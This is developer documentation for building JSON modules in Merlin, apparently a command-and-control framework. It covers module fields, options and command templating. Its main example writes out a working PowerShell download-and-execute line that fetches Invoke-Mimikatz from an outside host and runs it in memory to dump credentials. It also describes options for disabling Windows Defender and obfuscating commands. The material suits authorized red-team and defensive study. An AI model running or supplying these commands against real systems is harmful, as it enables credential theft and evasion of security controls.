################
Building Modules
################


Modules are used to perform a set of pre-defined actions or execute a program on an agent. The modules are described using JavaScript Object Notation (JSON). Modules will be stored in ``platform/arch/language/type`` directories. Every module *must* have the ``base`` object and *may* have additional objects. Examples of the module structures can be found in the ``data/modules/templates`` directory. All keys used when describing a module will be lowercase (i.e. name and NOT Name).

Base
----

The ``base`` module is required and is the lowest level of describing a module and its function.

.. csv-table:: Module Base
   :header: "Name", "Type", "Description", "Example"
   :widths: auto

   type_, string, ``standard`` or ``extended``, """type"": ""standard"""
   name, string, The name of the module, """name"": ""MyModuleName"""
   author, array of strings, A list of the module's authors, """author"": [""Russel Van Tuyl (@Ne0ndog)""]"
   credits, array of strings, A list of authors to credit original work leveraged in the module, """credits"": [""Joe Bialek (@JosephBialek)"", ""Benjamin Delpy (@gentilkiwi)""]"
   path, array of strings, The file path to the module, """path"": [""C"", ""windows"", ""system32""]"
   platform, string, The target platform the module can run on, """platform"": ""linux"""
   arch, string, The target architecture the module can run on, """arch"": ""x64"""
   lang, string, The target language the module leverages, """lang"": ""powershell"" or ""lang"": ""bash"""
   privilege, bool, Does the module require elevated privileges?, """privilege"": true"
   notes, string, Miscellaneous notes about the module, """notes"": ""This module doesn't work well on Ubuntu 14.04"""
   remote_, string, The remote path where the script associated with the module can be found, """remote"": ""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"""
   local_, array of strings, The local file system path where the script associated with the module can be found, """local"": [""data"", ""src"", ""PowerSploit"", ""Exfiltration"", ""Invoke-Mimikatz.ps1""]"
   options_, array of objects, The configurable options for the module, """options"": [{""name"": ""DumpCreds"", ""value"": ""true"", ""required"": false, ""description"":""[Switch]Use mimikatz to dump credentials out of LSASS.""}]"
   description, string, A description of the module and its function, """description"": ""this script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory."""
   commands_, array of strings, A list of the commands to be executed on the host when running the script, """commands"": [""powershell.exe"", ""-nop"", ""-w"", ""0"", ""\\\\""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');"",""Invoke-Mimikatz"", ""{{DumpCreds.Flag}}"", ""{{DumpCerts.Flag}}"", ""{{Command}}"", ""{{ComputerName}}"",""\\\\""""]"

Full Example:

.. code-block:: json

    {
      "base": {
        "type": "standard",
        "name": "Invoke-Mimikatz",
        "author": ["Russel Van Tuyl (@Ne0nd0g)"],
        "credits": ["Joe Bialek (@JosephBialek)", "Benjamin Delpy (@gentilkiwi)"],
        "path": ["windows", "x64", "powershell", "powersploit", "Invoke-Mimikatz.json"],
        "platform": "windows",
        "arch": "x64",
        "lang": "PowerShell",
        "privilege": true,
        "notes": "This is part of the PowerSploit project https://github.com/PowerShellMafia/PowerSploit",
        "remote": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1",
        "local": ["data", "src", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"],
        "options": [
          {"name": "DumpCreds", "value": "true", "required": false, "flag": "-DumpCreds", "description":"[Switch]Use mimikatz to dump credentials out of LSASS."},
          {"name": "DumpCerts", "value": null, "required": false, "flag": "-DumpCerts", "description":"[Switch]Use mimikatz to export all private certificates (even if they are marked non-exportable)."},
          {"name": "Command", "value": null, "required": false, "flag": "-Command", "description":"Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz \"privilege::debug exit\" as an example."},
          {"name": "ComputerName", "value": null, "required": false, "flag": "-ComputerName", "description":"Optional, an array of computernames to run the script on."}
        ],
        "description": "This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as dump credentials without ever writing the mimikatz binary to disk. The script has a ComputerName parameter which allows it to be executed against multiple computers. This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.",
        "commands": [
          "powershell.exe",
          "-nop",
          "-w 0",
          "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');",
          "Invoke-Mimikatz",
          "{{DumpCreds.Flag}}",
          "{{DumpCerts.Flag}}",
          "{{Command}}",
          "{{ComputerName}}",
          "\""
        ]
      },
      "powershell": {
        "disableav": true,
        "obfuscate": false,
        "base64": false
      }
    }

.. _type:

Type
^^^^

Modules can be either ``standard`` or ``extended``.

A **STANDARD** module does not leverage any Go packages or functions
from the `pkg/modules` directory. Standard modules are best used to run a single command, or a series of commands, that
leverage functionality and programs on the host where the agent is running. The
``data/modules/linux/x64/bash/exec/bash.json`` module is a standard module that takes a ``Command`` argument that is
subsequently run in ``bash -c {{Command}}``. This could be useful to abstract out command line arguments with easy to set
options or to run a single command across all agents using ``set Agent all`` while in the module's prompt.

An **EXTENDED** module DOES leverage code from an associated package ``pkg/modules``. The sRDI module
at ``data/modules/windows/x64/go/exec/sRDI.json`` is an example of an extended module that uses exported functions from
the srdi package at ``pkg/modules/srdi/srdi.go``. This extended module reads in a Windows DLL and returns shellcode that
will be executed on the agent. The extended function's code must be located in ``pkg/modules/<function>``.
The extended function's code must expose a ``Parse()`` function that returns an array of strings that contain commands for
the agent to interpret. Extended function must be programmed into the ``getExtendedCommand()`` function in ``modules.go``
and point to the module's exported ``Parse()`` function.

.. _remote:

.. _local:

Remote vs Local
^^^^^^^^^^^^^^^

When the module leverages a script, it can be accessed with *either* the ``local`` or ``remote`` values of the base module. The ``local`` specifies the file path on the server where the script can be found. Merlin *DOES NOT* ship with scripts. However, they should be copied to the ``data/source`` directory using something like Git. For example, you move into the ``data/source`` direct and do a ``git clone https://github.com/PowerShellMafia/PowerSploit.git``. When the ``local`` source is used, the script is uploaded to the target from the server. When the ``remote`` source is used, the script is downloaded from that location to the target.

.. _options:

Options
^^^^^^^

The ``options`` uses a special data type that requires five parts.

.. code-block:: json

    {
        "options": [
            {"name": "host", "value": "google.com", "required": true, "flag": "", "description": "The host to ping"},
            {"name": "count", "value": "3", "required": false, "flag": "-c", "description": "Stop after sending count ECHO_REQUEST packets."},
            {"name": "help", "value": "true", "required": false, "flag": "-h", "description": "Show help."}
        ]
    }

.. csv-table:: Module Base
   :header: "Name", "Type", "Description", "Example"
   :widths: auto

    name, string, The name of the option, """name"": ""ComputerName"""
    value, string, The configured value for the option, """value"": ""127.0.0.1"""
    required, bool, Is this option required?, """required"": false"
    flag, string, The command line flag for the option, """flag"": ""-ComputerName"""
    description, string, A short description of the option, """description"": ""The target computer name to run the script on"""

.. _name:

Name
""""

This is the name of the option that can be set by a user. This value is used as a variable in the ``commands`` section of the module file. The name is case sensitive (``Name`` != ``name`` != ``NAME``). An example option object looks like:

.. code-block:: json

    {"name": "count", "value": "3", "required": false, "flag": "-c", "description": "Stop after sending count ECHO_REQUEST packets."}

An example of setting the ``count`` option is:

.. code-block:: html

    Merlin[module][TEST]» set count 5
    [+]count set to 5
    Merlin[module][TEST]»

Using just the option's name within double curly braces will return both the flag and value. For example ``{{count}}`` would be parsed and replaced with ``-c 3``. The ``flag`` and ``value`` properties can be accessed individually if needed with ``{{count.Flag}}`` and ``{{count.Value}}``.

.. _value:

Value
"""""

This is the value that the options has been set to. The value can be directly accessed in the ``commands`` section by
using ``.Value`` after option's name. This is ideal for positional arguments that do not have a flag or specify an
application executable file name. An example option object that uses the ``value`` property is:

.. code-block:: json

    {"name": "host", "value": "google.com", "required": true, "flag": "", "description": "The host to ping"}

For example ``{{host.Value}}`` would be parsed and replaced with just the value of the ``host`` option (``google.com``).

If an option's value is empty, it will not be ignored and not parsed.

.. _flag:

Flag
""""

The ``flag`` property is used to specify what the notation is for a specific argument when executing a command.
The ``name`` property can be used in conjunction with the ``flag`` property when the flag is not descriptive enough to make
sense. A command line flag could start with a variety of options like ``-``, ``--``, or ``/``. An example option object that
uses a ``flag`` property is:

.. code-block:: json

    {"name": "help", "value": "true", "required": false, "flag": "-h", "description": "Show help."}

Some applications use a flag with no value after it. A common example of this ``-h`` to view an application's help
information. A flag, WITHOUT its value can be accessed in the ``commands`` section with ``.Flag``. For example
``{{help.Flag}}`` would be parsed and replaced with just ``-h``. If you want to only use the flag, and not its value, then
you must set its value to ``true``. Using just the option's name within double curly braces
will return both the flag and value. For example ``{{help}}`` would be parsed and replaced with ``-h true``.

.. _commands:

Commands
^^^^^^^^

The ``commands`` section of the module is used to provide the commands that are going to be executed on the host. The array should consist of every command in its own list item. You do not need to account for spaces. This is automatically done when the command is executed on the host.

You specify the location of an `option` by using double curly brace and the option's name_. This will be parsed and replaced with both the ``value`` and ``flag`` values from the option's list entry. The option's flag_ and value_ can be accessed individually. An example ``command`` section looks like:

.. code-block:: json

    {
        "options": [
            {"name": "host", "value": "google.com", "required": true, "flag": "", "description": "The host to ping"},
            {"name": "count", "value": "3", "required": false, "flag": "-c", "description": "Stop after sending count ECHO_REQUEST packets."},
            {"name": "help", "value": "", "required": false, "flag": "-h", "description": "Show help."}
        ],
        "commands": [
          "/bin/ping",
          "{{count}}",
          "{{host.Value}}"
        ]
    }

This would get parsed as ``/bin/ping -c 3 google.com``

If an option's value is not set, it will be ignored. An example of accessing only an option's flag while ignoring everything else is:

.. code-block:: json

    {
        "options": [
            {"name": "host", "value": "", "required": false, "flag": "", "description": "The host to ping"},
            {"name": "count", "value": "", "required": false, "flag": "-c", "description": "Stop after sending count ECHO_REQUEST packets."},
            {"name": "help", "value": "true", "required": false, "flag": "-h", "description": "Show help."}
        ],
        "commands": [
          "/bin/ping",
          "{{help.Flag}}"
          "{{count}}",
          "{{host.Value}}"
        ]
    }

This would get parsed as ``/bin/ping -h``

Powershell
----------

The ``powershell`` module is used to provide additional configuration options that pertain to PowerShell commands. Support for this module type is currently lacking. At this time is being used as placeholder for future development.

.. csv-table:: Module Base
   :header: "Name", "Type", "Description", "Example"
   :widths: auto

    disableav, bool, Should Windows Defender be disabled prior to running the command?, """disableav"" : true"
    obfuscate, bool, "Should the PowerShell command be obfuscated?", """obfuscate"": false"
    base64, bool, Should the command be Base64 encoded?, """base64"": true"
